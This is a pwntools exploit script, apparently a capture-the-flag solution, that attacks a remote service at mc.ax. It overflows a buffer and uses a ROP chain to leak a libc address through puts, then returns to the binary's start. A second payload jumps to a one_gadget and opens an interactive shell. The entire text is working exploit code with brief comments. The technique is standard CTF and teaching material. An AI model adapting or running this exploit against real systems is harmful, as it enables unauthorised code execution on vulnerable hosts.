from pwn import *

### GADGETS ###
ret = 0x4012a5
pop_rdi = 0x401313
pop_rsi_r15 = 0x401311
pop_pop_pop = 0x40130f

### SYMBOLS ###
puts = 0x401030
stdout_libc = 0x404060

p = remote("mc.ax", 31081)
p.recvuntil("DiceGang?\n")

# Offset buffer overflow
payload = "A" * 34

# We want to leak libc, so we use puts to at stdout address in 
# static address section
payload += p64(pop_rdi)
payload += p64(stdout_libc)
payload += p64(puts)

# We must pop three times for ret on start address, so it will relaunch the binary
payload += p64(0x40130f)

p.send(payload)

# we get the leak thanks to puts
leak_libc = p.recv()
stdout = unpack(leak_libc[-7:-1], "all", endian="little", sign=False)

# Open the provided libc
e = ELF('libc.so.6')
base_libc = stdout - e.symbols['_IO_2_1_stdout_']
one_gadget = base_libc + 0xcbd20

# We send the new buffer payload with one_gadget, rsi must be NULL, so
# we use a gadget to set rsi to 0
p.send("B" * 34 + p64(pop_rsi_r15) + p64(0) * 2 + p64(one_gadget))

p.interactive()
